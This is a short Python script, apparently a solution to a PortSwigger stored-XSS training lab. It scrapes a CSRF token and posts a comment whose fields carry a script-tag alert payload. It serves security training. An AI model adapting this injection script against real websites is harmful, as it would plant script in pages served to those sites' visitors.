"""
Exploit for lab:
    Stored XSS into HTML context with nothing encoded
    https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

By Xqweak.
"""
import requests
import argparse
import urllib
from bs4 import BeautifulSoup


class ExploitSelfXSS:
    def __init__(self,url):
        self.url = url

    def exploit_stored_xxs(self):
        """Exploit XSS Vulnerability in the lab"""
        s = requests.Session()
        s.get(self.url)
        # Get CSRF Token
        c = s.get(f'{self.url}/post?postId=1').content
        soup = BeautifulSoup(c, 'lxml')
        csrf_token = soup.find('input', {"name":"csrf"})["value"]
        # Exploit XSS
        payload = "<script>alert('lol')</script>"
        data = {
                "csrf":csrf_token,
                "postId":1,
                "name":payload,
                "comment":payload,
                "website":"http://lol.com",
                "email":"lol@lol.com"
                }
        attack_url = f'{self.url}/post?postId=1'
        attack = s.post(attack_url,data)
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' , '--url' , required=True, help="Portswigger's lab url")
    args = parser.parse_args()
    # Run the exploit
    lab = ExploitSelfXSS(args.url)
    lab.exploit_stored_xxs()
